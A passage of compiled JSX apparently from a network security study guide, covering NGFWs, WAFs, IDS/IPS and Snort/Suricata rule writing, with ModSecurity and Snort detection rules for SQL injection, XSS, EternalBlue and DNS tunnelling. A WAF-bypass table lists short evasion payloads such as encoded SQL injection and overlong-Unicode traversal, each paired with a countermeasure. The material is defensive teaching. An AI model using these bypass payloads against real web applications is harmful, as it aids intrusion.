+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Sandboxing"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Often"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Application Identification Example (Palo Alto):"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "An NGFW identifies Facebook traffic even if it uses port 443 (HTTPS):"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Not fooled by source port 80"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Identifies Facebook's TLS SNI field"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Matches application signatures against traffic patterns"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Can block Facebook while allowing other HTTPS traffic through App-ID"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Advantages & Disadvantages:"
+      })
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Advantages"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Disadvantages"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Comprehensive protection in one device"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Expensive (licensing costs)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Application-level visibility"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Performance degrades with DPI enabled"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Simplified policy management"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Complex configuration"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "TLS inspection catches encrypted threats"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Privacy concerns with TLS inspection"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Edge Cases:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "TLS 1.3 Encrypted SNI:"
+        }), " ESNI hides the server name, making app identification harder"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "QUIC protocol:"
+        }), " Google's QUIC over UDP bypasses some NGFWs; must be blocked or inspected"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Custom protocols:"
+        }), " Proprietary encrypted protocols that NGFW cannot decode"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "False positives:"
+        }), " DPI may flag legitimate traffic as malicious"]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "26-web-application-firewall-waf",
+      children: "2.6 Web Application Firewall (WAF)"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "How it works:"
+      }), " Specifically protects web applications from Layer 7 attacks: SQL injection, XSS, CSRF, RFI/LFI, etc. Can be deployed as:"]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Network-based appliance"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Host-based module (ModSecurity)"
+      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
+        children: "Cloud-based (Cloudflare WAF, AWS WAF)"
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "ModSecurity Configuration (OWASP CRS):"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "# /etc/modsecurity/modsecurity.conf\nSecRuleEngine On\n\n# Detect SQL injection\nSecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_HEADERS|... \\\n  \"@rx (?i:(?:select|union|insert|delete|update|drop|alter).*)\" \\\n  \"id:942100,phase:2,deny,status:403,msg:'SQL Injection Detected'\"\n\n# Detect XSS\nSecRule ARGS \"@rx (?i:<script|javascript:|onload=|onerror=)\" \\\n  \"id:941100,phase:2,deny,status:403,msg:'XSS Attempt Detected'\"\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "WAF Bypass Techniques:"
+      })
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Technique"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Example"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Countermeasure"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Case variation"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.code, {
+              children: "SeLeCt * FrOm"
+            })
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Normalize to lowercase before matching"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "URL encoding"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.code, {
+              children: "%27%20OR%201=1"
+            })
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Decode before inspection"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Unicode evasion"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.code, {
+              children: "%c0%ae%c0%ae/"
+            })
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Unicode normalization"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "HTTP Parameter Pollution"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: (0,jsx_runtime.jsx)(_components.code, {
+              children: "?id=1&id=2"
+            })
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Consistent parameter handling"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "HTTP Verb Tampering"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "GET instead of POST"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Enforce HTTP verb whitelist"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Advantages & Disadvantages:"
+      })
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Advantages"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Disadvantages"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Blocks OWASP Top 10 attacks"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Cannot prevent business logic flaws"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Virtual patching (buy time before code fix)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "False positives block legitimate traffic"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Easy to deploy (reverse proxy)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Performance overhead per request"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Protects legacy/unmaintained apps"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "TLS inspection complexity"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Edge Cases:"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
+      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "JSON/XML payloads:"
+        }), " WAF must parse complex nested JSON to detect injection"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "Multipart form data:"
+        }), " File uploads may contain malicious payloads in file content"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "GraphQL introspection:"
+        }), " WAF rules may not cover GraphQL query structures"]
+      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
+        children: [(0,jsx_runtime.jsx)(_components.strong, {
+          children: "WebSocket traffic:"
+        }), " Many WAFs do not inspect WebSocket messages"]
+      }), "\n"]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "27-firewall-types-comparison-table",
+      children: "2.7 Firewall Types Comparison Table"
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Feature"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Packet Filter"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Stateful"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Proxy"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "NGFW"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "WAF"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "OSI Layer"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "3/4"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "3/4"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "7"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "3-7"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "7"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Connection Tracking"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes (2 connections)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "App Inspection"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "None"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "None"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Full protocol"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "DPI"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "HTTP/HTTPS only"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Performance"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Highest"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "High"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Moderate"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Moderate (DPI heavy)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Moderate"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Complexity"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Low"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Medium"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "High"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "High"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Medium"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Cost"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Free (iptables)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Free (nftables)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Free (Squid)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "$$$ (Palo Alto)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "$$ (AWS WAF)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Use Case"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Edge router ACL"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Internal segmentation"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Content filtering"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Enterprise perimeter"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Web app protection"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Encrypted Traffic"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No inspection"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "No inspection"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes (MITM)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes (TLS decrypt)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Yes (reverse proxy)"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
+      id: "section-3-ids-and-ips",
+      children: "Section 3: IDS and IPS"
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "31-overview",
+      children: "3.1 Overview"
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "IDS (Intrusion Detection System):"
+      }), " Passive monitoring → generates alerts but does not block traffic.\n", (0,jsx_runtime.jsx)(_components.strong, {
+        children: "IPS (Intrusion Prevention System):"
+      }), " Inline → automatically blocks malicious traffic."]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "Real-World Analogy:"
+      }), " IDS is like a security camera that records everything and alerts when it sees something suspicious but cannot stop the event. IPS is like a security guard who stands at the door and physically stops threats from entering."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "32-detection-methods",
+      children: "3.2 Detection Methods"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Signature-Based Detection:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Matches traffic against a database of known attack patterns (signatures)."
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "Example Snort Signature:\n  alert tcp $EXTERNAL_NET any -> $HOME_NET 445\n    (msg:\"ET TROJAN WannaCry Ransomware SMBv1 Exploit\";\n     flow:to_server,established;\n     content:\"|ff|SMB|75 00|\"; distance:0; within:4;\n     reference:url,us-cert.cisa.gov/ncas/alerts/TA17-132A;\n     classtype:trojan-activity; sid:2024223; rev:2;)\n"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "Pros:"
+      }), " Low false positive rate, fast detection of known attacks.\n", (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Cons:"
+      }), " Cannot detect zero-day or variant attacks."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Anomaly-Based Detection:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Establishes a baseline of \"normal\" behavior and flags deviations."
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "Example → Baseline:\n  Normal HTTP request rate: 100-500 req/min per IP\n  Normal packet size: 40-1500 bytes\n  Normal protocol distribution: 60% TCP, 30% UDP, 10% ICMP\n\nAnomaly Alert:\n  IP 10.0.0.9: 12,000 req/min → ANOMALY (2400% over baseline)\n"
+      })
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "ML-based anomaly detection"
+      }), " uses unsupervised learning (autoencoders, isolation forests) to detect outliers in network traffic features."]
+    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
+      children: [(0,jsx_runtime.jsx)(_components.strong, {
+        children: "Pros:"
+      }), " Can detect novel/zero-day attacks.\n", (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Cons:"
+      }), " Higher false positive rate, requires baseline training period."]
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "33-snort-rule-writing",
+      children: "3.3 Snort Rule Writing"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Snort Rule Structure:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "[action] [protocol] [src_ip] [src_port] -> [dst_ip] [dst_port] ([options])\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Rule Components:"
+      })
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Field"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Options"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "Description"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "action"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "alert, log, pass, drop, reject"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "What to do on match"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "protocol"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "tcp, udp, icmp, ip"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Layer 4 protocol"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "src_ip"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "any, IP, CIDR, ! negation"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Source address"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "src_port"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "any, number, range (1:1024)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Source port"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "direction"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "-> (one-way), <> (bidirectional)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Traffic direction"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "dst_ip"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "any, IP, CIDR"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Destination address"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "dst_port"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "any, number, range"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Destination port"
+          })]
+        })]
+      })]
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Rule Options:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        children: "msg: \"message text\"\ncontent: \"|hex| or text\"; nocase; depth; offset; distance; within\nsid: unique rule ID\nrev: revision number\nclasstype: attack-classification\nreference: url,url,cve,CVE-2024-XXXX\nflow: to_server, from_server, established, stateless\nmetadata: custom key-value pairs\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Example Rules:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# 1. Detect SQL Injection\nalert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS\n  (msg:\"SQL Injection - UNION SELECT\";\n   flow:to_server,established;\n   content:\"UNION\"; nocase;\n   content:\"SELECT\"; nocase; distance:0;\n   pcre:\"/UNION.+SELECT/is\";\n   classtype:web-application-attack;\n   sid:1000001; rev:1;)\n\n# 2. Detect Port Scan (many ports from same source)\nalert tcp $EXTERNAL_NET any -> $HOME_NET any\n  (msg:\"Port Scan Detected\";\n   threshold:type both, track by_src, count 20, seconds 10;\n   classtype:attempted-recon;\n   sid:1000002; rev:1;)\n\n# 3. Detect SMB EternalBlue Exploit\nalert tcp $EXTERNAL_NET any -> $HOME_NET 445\n  (msg:\"ET EXPLOIT Microsoft SMBv1 EternalBlue Exploit\";\n   flow:to_server,established;\n   content:\"|ff|SMBv\"; depth:5;\n   content:\"|00 00 00|\"; distance:0; within:4;\n   byte_test:4,>,1000,0,relative;\n   reference:cve,2017-0144;\n   classtype:attempted-admin;\n   sid:1000003; rev:1;)\n\n# 4. Detect DNS Tunneling (long subdomain)\nalert udp $EXTERNAL_NET 53 -> $HOME_NET any\n  (msg:\"DNS Tunneling - Long Subdomain\";\n   dsize:>100;\n   content:\"|01 00 00 01 00 00 00 00 00 00|\"; depth:10;\n   pcre:\"/^[a-z0-9]{50,}\\.[a-z]+\\./R\";\n   classtype:unknown;\n   sid:1000004; rev:1;)\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "34-suricata-rule-writing",
+      children: "3.4 Suricata Rule Writing"
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: "Suricata is a modern, multi-threaded IDS/IPS that supports Snort-compatible rules plus advanced features."
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-yaml",
+        children: "# suricata.yaml snippet\nvars:\n  address-groups:\n    HOME_NET: \"[192.168.1.0/24,10.0.0.0/8]\"\n    EXTERNAL_NET: \"!$HOME_NET\"\n  port-groups:\n    HTTP_PORTS: \"80,8080,443\"\n    SHELLCODE_PORTS: \"!80,443\"\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Suricata-Specific Rule Features:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Suricata rule with file extraction\nalert http $EXTERNAL_NET any -> $HOME_NET any\n  (msg:\"Suspicious EXE Download\";\n   fileext:\"exe\";\n   filestore;\n   classtype:unknown;\n   sid:2000001; rev:1;)\n\n# Suricata rule with TLS fingerprint\nalert tls $EXTERNAL_NET any -> $HOME_NET any\n  (msg:\"Suspicious TLS Fingerprint - Malware C2\";\n   tls.fingerprint:\"B5:4D:8A:91:...\";\n   classtype:trojan-activity;\n   sid:2000002; rev:1;)\n\n# Suricata rule with DNS query matching  \nalert dns $HOME_NET any -> any 53\n  (msg:\"DGA Domain Detected\";\n   dns.query; content:\"xyz\"; distance:0;\n   dns.flags; content:\"|01 00|\"; distance:0;\n   classtype:unknown;\n   sid:2000003; rev:1;)\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
+      children: (0,jsx_runtime.jsx)(_components.strong, {
+        children: "Running Snort/Suricata:"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
+      children: (0,jsx_runtime.jsx)(_components.code, {
+        className: "language-bash",
+        children: "# Snort inline IPS mode\nsnort -Q -c /etc/snort/snort.conf -i eth0\n\n# Suricata IDS mode\nsuricata -c /etc/suricata/suricata.yaml -i eth0\n\n# Suricata pcap analysis (offline)\nsuricata -c /etc/suricata/suricata.yaml -r capture.pcap\n\n# Verify rules syntax\nsnort -T -c /etc/snort/snort.conf\n"
+      })
+    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
+      id: "35-ids-vs-ips-comparison",
+      children: "3.5 IDS vs IPS Comparison"
+    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
+      children: [(0,jsx_runtime.jsx)(_components.thead, {
+        children: (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.th, {
+            children: "Aspect"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "IDS"
+          }), (0,jsx_runtime.jsx)(_components.th, {
+            children: "IPS"
+          })]
+        })
+      }), (0,jsx_runtime.jsxs)(_components.tbody, {
+        children: [(0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Deployment"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Passive (mirror port / network tap)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Inline (between firewall and switch)"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
+          children: [(0,jsx_runtime.jsx)(_components.td, {
+            children: "Traffic Impact"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "None (monitoring only)"
+          }), (0,jsx_runtime.jsx)(_components.td, {
+            children: "Can drop/reset connections"
+          })]
+        }), (0,jsx_runtime.jsxs)(_components.tr, {
